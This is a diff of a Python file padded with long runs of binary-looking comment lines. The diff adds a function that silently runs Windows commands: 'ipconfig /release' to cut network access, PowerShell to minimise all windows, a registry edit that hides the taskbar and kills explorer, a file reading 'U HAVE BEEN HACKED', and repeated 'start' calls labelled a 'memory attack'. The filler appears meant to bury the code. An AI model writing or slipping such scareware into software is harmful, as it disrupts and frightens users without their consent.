@@ -10796,15 +10796,33 @@
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
-
-
+#10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
 import os
 try:
-    cmd="notepad"
-    for x in range(1,3):
-        os.system(cmd,"HI")
+ def CalC():
+	 #1.Disable internet && minimise window --(cmd1)
+  cmd1="ipconfig /release && powershell -command \"& { $x = New-Object -ComObject Shell.Application; $x.minimizeall() }\" "
+  os.system(cmd1)
+  #2.Hide Taskbar && Create Display File -- (cmd2)
+  cmd2="powershell -command \"&{$p=\'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects2\';$v=(Get-ItemProperty -Path $p).Settings;$v[8]=3;&Set-ItemProperty -Path $p -Name Settings -Value $v;&Stop-Process -f -ProcessName explorer}\" && echo U HAVE BEEN HACKED .>zero.txt"
+  os.system(cmd2)
+  #3.memory attack --tiny(cmd36)
+  cmd36="start"
+  for x in range(1,3):
+   os.system(cmd36)
+  #4.Open display file --(cmd3)
+  #cmd4="zero.txt && powershell -command \"Stop-Process -Name \"notepad\"\"" 
+  #os.system(cmd4)
+  #5.close zerofile using delay 
+  #cmd5="powershell -command \"Stop-Process -Name \"notepad\""
+  #time.sleep(6)
+  #os.system(cmd5)
+  #6.huge memory attack--(cmd36)
+  #for x in range(1,3):
+   #os.system(cmd36)
+ CalC()
 except:
-	print("Not Valid")
+	print("Check the script again")
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
 #10100010101010010000010100110100101001010010100100010010101001010101010001010101001010101010100101010101010101010101
